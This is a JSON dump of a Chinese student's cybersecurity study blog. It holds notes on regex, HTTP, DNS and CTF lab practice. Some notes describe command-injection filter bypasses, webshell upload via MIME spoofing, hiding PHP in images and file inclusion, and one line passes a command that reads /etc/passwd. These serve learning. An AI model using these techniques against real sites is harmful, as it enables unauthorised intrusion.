$或者\\Z 匹配字符串的结束位置 | 匹配两个或多个模式 [] 匹配方括号中的任意一个字符 [^] 匹配除方括号中字符以外的任意一个字符 () 将括号中作为一个整体以便将其中的内容获取到 4.1.1php正则表达式[\\w]+,\\w+,[\\w+]的区别？[\\w]+和\\w+没有区别，都是匹配数字和字母下划线的多个字符； [\\w+]表示匹配数字、字母、下划线和加号本身字符； 4.1.2例[]：表示数组而非排列，即不按固定次序位置排列；在[]内的字符可以任意次序出现。 [ABC]+：可以匹配”AAABBBCCC,BBBAAACCC,BACCBACAACBAC,…”，不是一定按固定A….B….C…的次序排列。 [\\w./-+]+：是匹配\\w [0-9a-zA-Z_] 或 . 或 / 或 - 或 + 字符； 在[./-+]内均表示字符本身； 在[]+外表示{1,}至少1次或多次； 在[.]内点，不是任意字符的意思，就是匹配点.字符本身，点.可以不需要加反斜杠.。 在[]内特殊字符，表示匹配特殊字符本身，不需要加反斜杠， 在[]外特殊字符，表示匹配特殊字符本身，必须要加反斜杠。 \\W 元字符用于查找非单词字符。 单词字符包括：a-z、A-Z、0-9，以及下划线。 故[^\\W]可以匹配所有单词字符 ^：非的意思 /^$/：正则匹配的开头结尾 4.1.3正则表达式“\\d+||(\\d+\\.\\d+”是什么意思？\\d 是匹配一个数字(0到9) \\d 前面多了第一个\\ 是为了在程序中转义第二个\\，这个你可以忽略 +表示 1个或多个组合起来 \\d+ 就表示多个数字，形如 12、44、6763…… . 匹配一个小数点 \\d+.\\d+ 就表示小数，形如12.334、0.12、87.343…… | 表示或者，一个竖线就够了 () 括号在这里表示分组，实际不匹配任何字符，此处不要括号也可以 \\d+||(\\d+.\\d+) 多个连续的数字或者 多个连续的数+小数点+多个连续的数翻译下就是 非负整数或者非负小数 4.23.binwalk使用binwalk +文件路径 //分析文件中隐藏的其他文件。dd if=图片名 of=ZIP压缩包的名称（自己命名） skip=偏移量 bs=1 5.1php定界符​ 短标签 &lt;% %&gt; ​ var_dump()查看变量类型 ​ 定界符 &lt;?php $a=&lt;&lt;&lt;EOT XXXXXXX EOT; echo $a; ?&gt; 5.2正则表达式(二）模式分隔符后的”i”标记这是一个大小写不敏感的搜索 模式中的 \\b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配 PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec() 除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）： |：管道操作符 A|B:无论执行的A命令是否正确，B命令都执行 &amp;&amp;：逻辑与 A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行 ||：逻辑或 A||B：只有在A命令没有执行失败的前提下，B命令才可以执行 &amp; A&amp;B:不管A是否执行成功，B命令都会执行 A&amp;B:不管A是否执行成功，B命令都会执行 5.3字符串经过md5加密 这里是0e开头的，在进行等于比较的时候，PHP 把它当作科学计数法，0 的无论多少次方都是零。 5.4各类文件的16进制开头结尾jpg 文件头: FF D8 文件尾： FF D9JPEG 文件头：FF D8 FF 文件尾：FF D9PNG 文件头：89 50 4E 47 文件尾：AE 42 60 82GIF（gif ）文件头：47 49 46 38 文件尾：00 3BZIP Archive（zip）文件头：50 4B 03 04 文件尾：50 4BTIFF（tif）文件头：49 49 2A 00 文件尾：未知Windows Bitmap（bmp）文件头：42 4D 文件尾：未知CAD（dwg）文件头：41 43 31 30 文件尾：未知XML（xml）文件头：3C 3F 78 6D 6C 文件尾：未知HTML（html）文件头：68 74 6D 6C 3Egif图像开始标志：47 49 46 38 39 61 结束标志：01 01 00 3B 5.5局域网主机发现使用netdiscover 探测局域网内的主机，目的是发现需要渗透的主机 指定IP段 例如：10.10.10.0 netdiscover -r 10.10.10.0/24 选择监听的网卡：比如eth0 netdiscover -i eth0 主动发现：-i指定所要侦听的网卡，-r指定ip段。 netdiscover -i eth0 -r 10.10.10.0/24 6.1vim 交换文件名在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容 以 index.php 为例： 第一次产生的交换文件名为 .index.php.swp 再次意外退出后，将会产生名为 .index.php.swo 的交换文件 第三次产生的交换文件则为 .index.php.swn 二、学习总结这些是近十天的学习总结，学的不算很多，但很杂乱，近期恶补了一些php代码并且参加了一些ctf比赛，虽然往往一场ctf比赛只能写出一道甚至一道都写不出，但总的来说，应该算是有了一定的基础。 算算时间，学习网安也有大半年了，但有效时间也只有不到两个月，在这有效学习时间内，我学习了以下内容。 1.burpsuite抓包爆破 2.top10漏洞（除CSRF） 3.工具的利用 4.近期看着博客步骤对breach1.0进行一次完整的渗透 5.PHP语言 6.MySQL数据库 7.认识HTML，css，js 8.linux基础 9.SQL基础 10.web渗透之信息收集 三、感悟今天是2022年10月30日，距离第一次接触网安已有一年有余，那时意气风发，抱有对黑客技术的热爱与热情加入了信息安全实验室，但在实验室，我迷茫了，对所学知识的模糊认识产生了自我否定——我是不是不适合网安，我是不是比较笨拙？带着疑惑我不知所措，导致在寒假期间彻底摆烂，也因此主动退出实验室。 至2022年4月13日，胡老师想找几个对网安有兴趣的学生学习网安知识，我心中的火又燃了起来，我知道这是一个机会，证明我可以学好网安的唯一机会，我又开始学习网安。这次学的不再是逆向工程，而是web安全！ 由于当时已到学期中旬，专业课繁多，学习时间较少，也快到期末，所以网安学习计划又搁置了，到了暑假事务繁多，有效学习时间也只有不到半个月，对此我深深惭愧。 寒暑假逆袭的关键，而我却没有加以利用，认真去学习！ 接着开学封校，一直到九月中旬才能来校学习，这次，我不会再浪费时间，我一直以来的黑客梦永远不会消散。 虽然道路艰难，但我会一直前行，漫漫长征路，偏向虎山行，此志共勉！","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]},{"title":"网安基础总结五","slug":"网安基础总结五","date":"2022-07-17T06:44:17.000Z","updated":"2023-01-07T07:14:19.295Z","comments":true,"path":"2022/07/17/网安基础总结五/","link":"","permalink":"http://alunxzhou.github.io/2022/07/17/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%94/","excerpt":"rce 远程命令/代码执行漏洞反引号``反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。","text":"rce 远程命令/代码执行漏洞反引号``反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。 单引号，双引号适用条件:过滤了字符串放在shell命令中，绕过正则匹配且不影响原意 空格绕过&lt; &lt;&gt; 重定向符%09(需要php环境)${IFS}$IFS$9{cat,flag.php} //用逗号实现了空格功能%20%09 读文件绕过(cat绕过)适用条件:过滤了cat1)more:一页一页的显示档案内容(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页(3)head:查看头几行(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示(5)tail:查看尾几行(6)nl：显示的时候，顺便输出行号(7)od:以二进制的方式读取档案内容(8)vi:一种编辑器，这个也可以查看(9)vim:一种编辑器，这个也可以查看(10)sort:可以查看(11)uniq:可以查看(12)file -f:报错出具体内容grep grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行 linux通配符绕过适用条件:过滤了flag，没有过滤 ? *在linux系统中 有一些通配符 匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0[abcd] 匹配abcd中任何一个字符[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]},{"title":"网安基础总结四","slug":"网安基础总结四","date":"2022-06-26T06:44:11.000Z","updated":"2023-01-07T07:11:48.027Z","comments":true,"path":"2022/06/26/网安基础总结四/","link":"","permalink":"http://alunxzhou.github.io/2022/06/26/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%9B%9B/","excerpt":"思考总结1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。 2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。 3.MIME类型：一种文件拓展名包含一种MIME类型。","text":"思考总结1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。 2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。 3.MIME类型：一种文件拓展名包含一种MIME类型。 文件上传漏洞第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。 以下三条一句话木马 1.此类为POST类型一句话木马，需蚁剑连接。 2.此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效） 3.此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效） 目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high” low级别将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。 medium级别此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。 用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件 文件包含漏洞LFI本地文件包含 Local File Include (LFI) 所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。 所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。 RFI远程文件包含 Remote File Include (RFI) 如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。 远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。 文件包含漏洞也可以和文件上传漏洞相配合使用。 通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入 copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。 这段代码意思是生成shell.php这个新文件，并将');?>写入。 最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。 这就叫条件竞争绕过 竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]},{"title":"网安基础总结三","slug":"网安基础总结三","date":"2022-05-08T06:44:05.000Z","updated":"2023-01-07T07:16:23.852Z","comments":true,"path":"2022/05/08/网安基础总结三/","link":"","permalink":"http://alunxzhou.github.io/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/","excerpt":"思考总结1.cms指纹识别在线识别 [BugScaner]http://whatweb.bugscaner.com/look/ [云悉指纹]http://www.yunsee.cn/finger.html [whatweb]https://whatweb.net/","text":"思考总结1.cms指纹识别在线识别 [BugScaner]http://whatweb.bugscaner.com/look/ [云悉指纹]http://www.yunsee.cn/finger.html [whatweb]https://whatweb.net/ 2.在cmd下进入 要查看的文件目录 然后输入命令 certutil -hashfile 文件名称.文件类型 MD5 如 certutil -hashfile webpro.war MD5 注意后面有个MD5,不然会生成一个其他的值。","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]},{"title":"网安基础总结二","slug":"网安基础总结二","date":"2022-05-01T06:43:59.000Z","updated":"2023-01-07T07:07:53.667Z","comments":true,"path":"2022/05/01/网安基础总结二/","link":"","permalink":"http://alunxzhou.github.io/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/","excerpt":"本周重点 1.学习进展 1.完成burpsuite的安装以及java环境的配置。 2.完成对http协议的学习以及对url，web前端的一些浅显的了解。 3.了解了公网ip和内网ip的区别.","text":"本周重点 1.学习进展 1.完成burpsuite的安装以及java环境的配置。 2.完成对http协议的学习以及对url，web前端的一些浅显的了解。 3.了解了公网ip和内网ip的区别. 2.遗留问题 ​ 1.内网IP与公网IP的联系和区别是什么。内网IP是不是有很多，而公网IP只有几个或者是某些内网IP连接一个公网IP。 ​ 2.自己电脑上设置的IP地址会不会与别人的IP地址想冲突，导致自己上不了网。 3.下周计划 1.学习数据库基础 2.学习SQL基础 3.学习MySQL部署与使用 4.思考总结 ​ 首先总结一下burpsuite的安装与Java环境的配置！ 1.首先找到系统设置中的高级系统设置，点击环境变量。 2.找到系统变量path设置 3.点击并编辑两条新的文本 %JAVA_HOME%\\bin %JAVA_HOME%\\jre\\bin 4.添加新的系统变量JAVA_HOME 变量值是jdk的安装路径。 5.添加CLASSPATH这个新的系统变量 变量值是 .;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar 切记，最前方有 .； 6.配置完成后点击确定。 7.在cmd命令中输入java -version和javac -version 若出现版本号，则Java环境配置成功。 后面的burpsuite安装过程很简单，这里不细讲。 ​ 第二，总结一下http协议 Request请求数据包 HTTP规划定义了8种可能的请求方法: 1 GET:检索URL中标识资源的一个简单请求 2HEAD:与GET方法相同， 服务器只返回状态行和头标，并不返回请求文档 3 POST: 服务器接受被写入客户端输出流中的数据的请求 4PUT:服务器保存请求数据作为指定URI新内容的请求 5DELETE:服务器删除URL中命令的资源的请求 6OPTIONS:关于服务器支持的请求方法信息的请求 7 TRACE: web服务器反馈Http请求和其头标的请求 8 CONNECT :已文档化，但当前未实现的一个方法，预留做隧道处理 例如： 请求行 GET /index.html HTTP/1.1 请求方法：GET 请求url：index.html HTTP版本：HTTP/1.1 ​ 划重点！！！ 下面用chrome浏览器对某一网页进行检查 我们随便进入一个网页如下图 然后点击network 按住ctrl+r 就可以得到这一网站里的内容，这就类似于burp suite的抓包 我们看一下请求数据包request header 可以清楚的看到，他的请求数据包里的请求行是GET————一直到HTTP/1.1 GET后的一大串内容则是检索URL中的标识资源。 我们说一下url的组成 URL简单来说就是输入地址栏里的一大串网址，按此网页的地址栏内的网址为例https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG 第一部分是url方案，方案可以告知web客户端要怎么访问资源。这里是https://，也就是https协议。常见的还有http、ftp等。第二部分指定服务器的位置，这部分告知web客户端资源的位置。例子中是ayitsec.yuque.com第三部分是资源路径，路径说明了资源在服务器的位置。也即是例子中的 staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG 我的理解： 1.请求行下面的都是请求头，其中HOST请求头里面的内容则是url中的第二部分——指定服务器位置 2.我们说的http协议有八种请求方法，其中最常用的两种请求方法是get与post。 3.GET请求把参数放在url中，POST请求通过request body传递参数（也就是空行下的那一行）。而且GET请求对url中传送的参数有长度限制，而POST 则没有长度限制。 4.GET请求里，请求行中‘？’分割实际的url和参数，‘&amp;’是url指定的参数间的分隔符。所以，我们的例子中的参数就是toc_node_uuid=w9bQEpfPpVSSY8SG 请求头： 1.HOST：主机或域名地址。对应网址URL中的Web名称和端口号。 2.Accept:指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。 3.User-Agent: 是客户浏览器名称 4.Accept-Langeuage: 指出浏览器可以接受的语言种类，如en或en-us， 指英语。 5.connection: 用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1使用Keep-Alive为默认值， 这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接。（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点。 6 Cookie: 浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。 7 Referer: 表明产生请求的网页URL。 如比从网页/ icconcept/ index. jsp中点击一个链接到网页/icwork/ search，在向服务器发送的GET/icwork/ search中的请求中，Referer是http://hostname:8080/icconcept /index.jsp. 8 Content-Type: 用来表名request的内容类型。可以用HttpServletRequest的getContentType ()方法取得。 9 Accept-Charset: 指出浏览器可以接受的字符编码。英文浏览器的默认值是IS0-8859-1. 10 Accept-Encoding: 指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到web响应之后先解码，然后再检查文件格式。 空行 最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 请求数据 使用POST传送，最常使用的是Content-Type和Content-Length头标 Response返回数据包数据格式 1.状态行：协议版本，数字形式的状态代码和状态描述，个元素之间以空格分隔 2.响应头标:包含服务器类型、日期、长度、内容类型等 3.空行:响应头与响应体之间用空行隔开 4.响应数据:浏览器会将实体内容中的数据取出来，生成相应的页面 HTTP响应码: 1xx: 信息，请求收到，继续处理 2xx: 成功，行为被成功地接受、理解和采纳 3xx: 重定向，为了完成请求，必须进一步执行的动作 4xx:客户端错误 5xx:服务器错误 200 存在文件 403 存在文件夹 3xx 均可能存在 404 不存在文件及文件夹 500 均可能存在 ​ 第三.内网ip和公网ip 内网ip：路由器以内的网络。可以连接互联网，但是互联网无法直接连接内网（需要端口映射） 公网IP：互联网IP地址。 IP地址就像家庭地址一样，公网IP是小区地址，小区中又有很多住户，内网ip就像你家具体的门牌号，你可以从小区里出去（内网ip能连接到互联网），但是外人进入你家需要进行验证（公网IP无法直接连接到内网ip）具体操作用邮寄系统作比喻。有公网ip，相当于说你有一个详细的地址，你可以写信寄给别人，别人也可以用这个地址和你进行各种通讯。来看看没有公网ip是一种什么局面。这就像是住在一个大院里 ，所有进出邮件都由传达室转交。如果是普通的邮件，可以放在传达室，传达室的大爷大妈看到你了就会转交给你，或者你自己去传达室看看，这不重要，反正虽然经过了一点波折，还是可以看到邮件的。假设以下如果来了个挂号，邮局的人员说：必须本人签收。传达室的大爷就说了：对不起，所有的邮件都要经过我中转~。于是邮局的人员只好把信带回去了……实际情况和这个差不多，所谓没有公网ip，就是说你的机子并非直接连接上internet，而是所有通讯经过一台代理（一般是透明网关）进行中转，这时候问题就来了，就会有一些通讯无法在这种机制下顺利进行。比如两个网吧之间，网吧的机子是没有公网 ip的典型例子，通常两个网吧之间通过QQ传送文件就不是直接两台机器建立连接传输的，而是通过QQ的公网服务器进行中转传输了。又比如没有公网ip，上网玩对战游戏通常会有问题，你建立的游戏别人无法加入等等，当然通过服务提供商的公网服务器中转还是可以达成两个没有公网IP的机器进行交流的。 ​ 第四：使用burp suite时浏览器的代理设置。 1.火狐浏览器安装插件 FoxyProxy 标准版 2.Edge浏览器安装插件 Proxy SwitchyOmega 什么时候用就打开。 注：平常安装的burp suite只能抓取 http:// 不能抓取 https://","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]},{"title":"网安基础总结一","slug":"网安基础总结一","date":"2022-04-24T06:43:44.000Z","updated":"2023-01-07T06:55:35.154Z","comments":true,"path":"2022/04/24/网安基础总结一/","link":"","permalink":"http://alunxzhou.github.io/2022/04/24/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%80/","excerpt":"域名：顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等http://baidu.com 一级域名","text":"域名：顶级域名，又称一级域名，常见的有”.com”、”.org”、”.net”、”.cn”等http://baidu.com 一级域名 二级域名bbs.baidu .com 二级域名tieba.baidu .com 二级域名 多级域名： ..__.com 顶级域名： com 商业机构 edu 教育及研究机构 firm 公司企业 gov 政府机构 info 信息服务 net 网络服务机构 nom 个人 org 专业团体 rec 娱乐类机构 store 销售类公司企业 web 从事WWW活动的机构 DNS是什么：DNS是域名系统,Domain Name System的缩写,服务域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。 DNS就是把域名解析为IP地址，提供我们上网，我们能够上网最终是找到IP地址。 比如，http://xxxx.com是域名，那么他的IP地址假设是144.144.144.144，我们用浏览器访问该的网页，先到DNS服务器找http://xxxx.com对应的IP地址，然后通过IP地址进行访问。 域名系统为Internet上的主机分配域名地址和IP地址。用户使用域名地址，该系统就会自动把域名地址转为IP地址。域名服务是运行域名系统的Internet工具。执行域名服务的服务器称之为DNS服务器，通过DNS服务器来应答域名服务的查询。 DNS服务器地址: 域名解释服务器,打比方,当你在地址栏输入 www.dns.com 时,电脑不是直接就连接到百度的服务器里的,而是先向这个DNS服务器查询www.dns.com的IP地址,然后再按照这个IP地址转到百度的服务器里.一般都是每个地区有一个特定的DNS服务器的,由ISP提供的. 由于ISP的拨号服务器一般都有缺省的DNS，所以你可以不用设置DNS，如果你需要指定一台DNS，你一定要了解这台DNS的准确IP（比如福州的163用户的DNS为202.101.98.55）。DNS设置方法如下：在“控制面板”下打开“网络”里的“TCP/IP”的“属性”，在“DNS设置”栏目选择“启用DNS”，并将DNS的IP地址添加即可。 IP192.168.X.X一般都是带有路由的IP，网关默认最后1位肯定是1，子网掩码 255.255.255.0简单说C类的IP，子网都可以这样设置 我的理解：DNS服务器地址就是将人们可以理解的域名解析成计算机可以获取的二进制语言（也就是这个域名实际所代表的IP地址） 什么是CDN：cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了CDN与DNS的关系： dns与cdn的关系刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。 网站程序产生漏洞：SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。","categories":[{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]}],"categories":[{"name":"命令执行","slug":"命令执行","permalink":"http://alunxzhou.github.io/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"图片分离术","slug":"图片分离术","permalink":"http://alunxzhou.github.io/categories/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB%E6%9C%AF/"},{"name":"图片隐写","slug":"图片隐写","permalink":"http://alunxzhou.github.io/categories/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"},{"name":"ctf工具","slug":"ctf工具","permalink":"http://alunxzhou.github.io/categories/ctf%E5%B7%A5%E5%85%B7/"},{"name":"sql注入","slug":"sql注入","permalink":"http://alunxzhou.github.io/categories/sql%E6%B3%A8%E5%85%A5/"},{"name":"DVWA","slug":"DVWA","permalink":"http://alunxzhou.github.io/categories/DVWA/"},{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"RSA基础","slug":"RSA基础","permalink":"http://alunxzhou.github.io/categories/RSA%E5%9F%BA%E7%A1%80/"},{"name":"文件包含","slug":"文件包含","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件上传","slug":"文件上传","permalink":"http://alunxzhou.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://alunxzhou.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"},{"name":"下载漏洞","slug":"下载漏洞","permalink":"http://alunxzhou.github.io/categories/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"name":"网安基础篇","slug":"网安基础篇","permalink":"http://alunxzhou.github.io/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"},{"name":"MISC","slug":"MISC","permalink":"http://alunxzhou.github.io/tags/MISC/"},{"name":"ctf","slug":"ctf","permalink":"http://alunxzhou.github.io/tags/ctf/"},{"name":"靶场","slug":"靶场","permalink":"http://alunxzhou.github.io/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"RSA","slug":"RSA","permalink":"http://alunxzhou.github.io/tags/RSA/"},{"name":"web基础","slug":"web基础","permalink":"http://alunxzhou.github.io/tags/web%E5%9F%BA%E7%A1%80/"}]}